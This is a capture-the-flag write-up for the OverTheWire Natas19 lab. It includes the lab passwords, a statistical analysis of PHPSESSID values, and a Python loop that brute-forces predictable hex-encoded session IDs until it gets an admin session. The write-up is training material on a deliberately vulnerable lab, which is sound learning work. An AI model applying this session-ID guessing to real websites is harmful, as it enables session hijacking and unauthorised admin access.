# Natas19

*	user: `natas19`
*	pass: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`
*	url: `http://natas19.natas.labs.overthewire.org`
*	flag: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`

## Procedure

1.	Since values of PHPSESSID are not sequential, we have to try if it's
	possible to evaluate the randomness in order to predict values. To do that
	we need a significant number of generated PHPSESSID and the try to execute
	some statistics.

2.	Statistics are executed by Python script
	(natas19_stats.py)[./scripts/nata19_stats.py]. Run it

		$ python natas19_stats.py
		Just a simple analysis: 
		  PHPSESSIDs with 18 chars: 82.00%
		  PHPSESSIDs with 14 chars: 2.00%
		  PHPSESSIDs with 16 chars: 14.00%
		
		Chose length: 18
		
		With 300 captures
		  char at position  0 of PHPSESSID is '3' with accurancy 100.00%
		  char at position  1 of PHPSESSID is '1' with accurancy 20.00%
		  char at position  2 of PHPSESSID is '3' with accurancy 100.00%
		  char at position  3 of PHPSESSID is '2' with accurancy 14.00%
		  char at position  4 of PHPSESSID is '3' with accurancy 100.00%
		  char at position  5 of PHPSESSID is '3' with accurancy 13.00%
		  char at position  6 of PHPSESSID is '2' with accurancy 100.00%
		  char at position  7 of PHPSESSID is 'd' with accurancy 100.00%
		  char at position  8 of PHPSESSID is '6' with accurancy 100.00%
		  char at position  9 of PHPSESSID is '1' with accurancy 100.00%
		  char at position 10 of PHPSESSID is '6' with accurancy 100.00%
		  char at position 11 of PHPSESSID is '4' with accurancy 100.00%
		  char at position 12 of PHPSESSID is '6' with accurancy 100.00%
		  char at position 13 of PHPSESSID is 'd' with accurancy 100.00%
		  char at position 14 of PHPSESSID is '6' with accurancy 100.00%
		  char at position 15 of PHPSESSID is '9' with accurancy 100.00%
		  char at position 16 of PHPSESSID is '6' with accurancy 100.00%
		  char at position 17 of PHPSESSID is 'e' with accurancy 100.00%

	The output inform us that 82% of the captures is 18 chars length, so it's
	a good candidate for our flag. Then, by considering only IDs with 18 chars,
	we have an evaluation of the characters. According to the statistics, our
	PHPSESSID should be like this:

		3 [?] 3 [?] 3 [?] 2d61646d696e

3.	Now we can try with a brute-force because the range of possible solutions
	is reasonable (16x16x16).

		while x <= 0xf:
			while y <= 0xf:
				while z <= 0xf:
					phpsessid = (('3%s3%s3%s2d61646d696e') %
								 (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
					cookies['PHPSESSID'] = phpsessid
					print 'Trying with: %s' % phpsessid
					r = requests.get(target, auth=auth, params=params, cookies=cookies)
					if "You are logged in as a regular user." not in r.text:
						print r.text
						sys.exit(0)
					z += 1
				y += 1
				z = 0x0
			x += 1
			y = 0x0
			z = 0x0

	Also in this case, Python is our best friend...

		$ python natas19.py
		Trying with: 3030302d61646d696e
		...
		Trying with: 33373f2d61646d696e
		Trying with: 3338302d61646d696e
		Trying with: 3338312d61646d696e
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
		<body>
		<h1>natas19</h1>
		<div id="content">
		<p>
		<b>
		This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
		</b>
		</p>
		You are an admin. The credentials for the next level are:<br><pre>Username: natas20
		Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
		</body>
		</html>
